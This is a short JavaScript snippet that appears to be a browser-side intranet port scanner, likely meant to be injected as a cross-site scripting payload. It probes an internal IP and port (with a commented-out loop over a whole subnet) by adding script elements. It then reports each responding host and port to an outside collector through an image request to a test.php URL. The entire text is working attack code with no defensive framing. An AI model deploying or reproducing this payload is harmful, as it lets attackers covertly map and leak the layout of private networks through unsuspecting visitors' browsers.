function ipsend(ip,netport){
    new Image().src="http://ip/test.php?ip="+escape(ip)+"&port="+netport;
}

function ipCreate(ip){
    var ips = ip.replace(/(\d+\.\d+\.\d+)\.\d+/,'$1.');
    //单ip单端口
    ElementCreate(ip,"80");

    //c端单端口
    // for(var i=1;i<=255;i++){
    //      ElementCreate(ips+i,"8888");
    // }
}

function ElementCreate(ip,xport){
    var url = "http://"+ip+":"+xport;
    var scriptElement = document.createElement("script");
    scriptElement.src=url;
    scriptElement.setAttribute("onload","ipsend(\'"+ip+"\',\'"+xport+"\')");
    document.body.appendChild(scriptElement);
}
ipCreate("Intranet-ip");
